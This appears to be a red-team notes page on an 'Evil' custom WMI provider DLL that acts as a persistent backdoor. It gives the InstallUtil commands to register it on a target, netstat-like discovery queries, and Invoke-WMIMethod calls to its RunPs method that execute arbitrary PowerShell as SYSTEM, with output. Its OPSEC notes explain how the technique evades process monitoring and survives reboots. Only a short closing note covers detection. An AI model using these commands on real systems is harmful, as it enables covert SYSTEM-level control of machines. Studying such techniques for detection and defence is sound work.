
> [!abstract] Evil Network Connection WMI Provider
> A custom WMI provider (`EvilNetConnectionWMIProvider.dll`) that acts as a stealthy backdoor. It exposes `netstat`-like functionality via WMI and includes a `RunPs` method that allows attackers to execute arbitrary PowerShell commands directly as `NT AUTHORITY\SYSTEM`.
> **MITRE ATT&CK Mapping:** [T1047 - Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047/) | [T1046 - Network Service Discovery](https://attack.mitre.org/techniques/T1046/) | [T1543.003 - Create or Modify System Process: Windows Service](https://attack.mitre.org/techniques/T1543/003/)

## 1. Installation & Uninstallation

> [!info]+ Installing the Custom WMI Provider
> The provider must be registered on the target machine using `InstallUtil.exe` from an elevated (Administrator) prompt.
> 
> **Install:**
> ```powershell
> cd \EvilNetConnectionWMIProvider-master\EvilNetConnectionWMIProvider\bin\Debug
> InstallUtil.exe /i EvilNetConnectionWMIProvider.dll
> ```
> 
> **Uninstall:**
> ```powershell
> cd \EvilNetConnectionWMIProvider-master\EvilNetConnectionWMIProvider\bin\Debug
> InstallUtil.exe /u EvilNetConnectionWMIProvider.dll
> ```

---

## 2. Network Discovery (Netstat Functionality)

> [!example]+ Querying Active Connections
> Once installed, the provider creates a custom WMI class called `Win32_NetConnection`. You can query this class to retrieve active TCP/UDP connections and listening ports, similar to running `netstat -ano`, but entirely through WMI.
> 
> ```powershell
> Get-WMIObject Win32_NetConnection | select LocalAddress, LocalPort, RemoteAddress, RemotePort, Protocol, State | ft -AutoSize
> ```
> 
> **Example Output:**
> ```text
> LocalAddress LocalPort RemoteAddress  RemotePort Protocol State
> ------------ --------- -------------  ---------- -------- -----
> 127.0.0.1         3369 127.0.0.1           19872 TCP      Established
> 192.168.1.18     14047 192.30.252.91         443 TCP      Established
> 0.0.0.0            135                         0 TCP      LISTENING
> 0.0.0.0            445                         0 TCP      LISTENING
> 0.0.0.0           3702                         0 UDP      LISTENING
> 192.168.1.18       137                         0 UDP      LISTENING
> ```

---

## 3. Execution: PowerShell as SYSTEM

> [!danger]+ Arbitrary Command Execution via `RunPs`
> The provider includes a custom method named `RunPs`. When invoked, it executes the specified PowerShell command in the context of the WMI service host (`WmiPrvSE.exe`), which runs as `NT AUTHORITY\SYSTEM`.
> 
> **Execute** `whoami`**:**
> ```powershell
> Invoke-WMIMethod -Class Win32_NetConnection -Name RunPs -ArgumentList "whoami", $NULL
> ```
> *Output:*
> ```text
> ReturnValue : nt authority\system
> ```
> 
> **Execute** `Get-Process`**:**
> ```powershell
> Invoke-WMIMethod -Class Win32_NetConnection -Name RunPs -ArgumentList "Get-Process", $NULL
> ```
> *Output:*
> ```text
> Handles NPM(K) PM(K)      WS(K) VM(M)   CPU(s)   Id ProcessName       
> ------- ------ -----      ----- -----   ------   -- -----------    
> 134       5    5372       7468    32            8800 audiodg
> 1214      13     5376       5888    40    72.03    544 lsass
> ...
> ```

> [!warning] OPSEC & Detection Notes
> - **Persistence:** Registering a custom WMI provider DLL is a highly persistent technique. The DLL remains loaded, and the custom class survives reboots until explicitly uninstalled.
> - **Stealth:** Execution via `RunPs` blends in with standard administrative WMI queries. It does not spawn `powershell.exe` or `cmd.exe` directly on disk, avoiding standard process monitoring.
> - **Detection:** Defenders should monitor for the use of `InstallUtil.exe` loading unknown DLLs. Additionally, querying or executing methods on non-standard WMI classes (like `Win32_NetConnection`) can be detected via WMI Activity ETW logs (Event ID 5861).

